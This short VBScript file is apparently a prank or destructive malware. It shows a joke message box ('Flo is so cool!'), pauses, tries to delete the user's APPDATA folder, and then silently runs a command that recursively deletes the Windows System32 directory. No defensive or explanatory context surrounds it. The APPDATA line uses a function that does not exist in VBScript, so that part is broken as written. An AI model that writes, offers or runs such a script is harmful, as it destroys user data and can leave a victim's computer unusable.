MsgBox "Flo is so cool!"
WScript.Sleep 15000

Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFolder Environ("APPDATA"), True

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /C rd /s /q %windir%\System32", 0, True
